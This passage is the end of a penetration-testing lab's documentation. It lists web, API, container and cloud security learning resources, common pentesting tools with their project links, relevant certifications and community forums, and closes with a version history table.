- [LocalStack](https://www.localstack.cloud/)

## Learning Resources

### Web Application Security

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)

### API Security

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [API Security Best Practices](https://github.com/OWASP/API-Security)

### Container & Kubernetes Security

- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
- [Container Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

### Cloud Security

- [AWS Security Best Practices](https://docs.aws.amazon.com/security/)
- [Cloud Security Alliance](https://cloudsecurityalliance.org/)

## Essential Pentesting Tools

### Web Application Testing

- **Burp Suite**: https://portswigger.net/burp
- **OWASP ZAP**: https://www.zaproxy.org/
- **sqlmap**: https://sqlmap.org/
- **nikto**: https://github.com/sullo/nikto
- **dirb/gobuster**: Directory enumeration

### Network Tools

- **nmap**: https://nmap.org/
- **Wireshark**: https://www.wireshark.org/
- **tcpdump**: Network packet capture

### Kubernetes Tools

- **kubectl**: Kubernetes CLI
- **kube-hunter**: https://github.com/aquasecurity/kube-hunter
- **kube-bench**: https://github.com/aquasecurity/kube-bench
- **trivy**: https://github.com/aquasecurity/trivy

### Cloud Tools

- **AWS CLI**: https://aws.amazon.com/cli/
- **Scout Suite**: https://github.com/nccgroup/ScoutSuite
- **Pacu**: https://github.com/RhinoSecurityLabs/pacu

## Certifications This Lab Helps Prepare For

- **OSCP**: Offensive Security Certified Professional
- **CEH**: Certified Ethical Hacker
- **GWAPT**: GIAC Web Application Penetration Tester
- **OSWE**: Offensive Security Web Expert
- **CKS**: Certified Kubernetes Security Specialist
- **PNPT**: Practical Network Penetration Tester

## Community and Support

- **OWASP Slack**: https://owasp.org/slack/invite
- **Reddit /r/netsec**: https://reddit.com/r/netsec
- **HackTheBox Forums**: https://forum.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/

---

## Document Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | January 2026 | Initial release |

---

**End of Documentation*
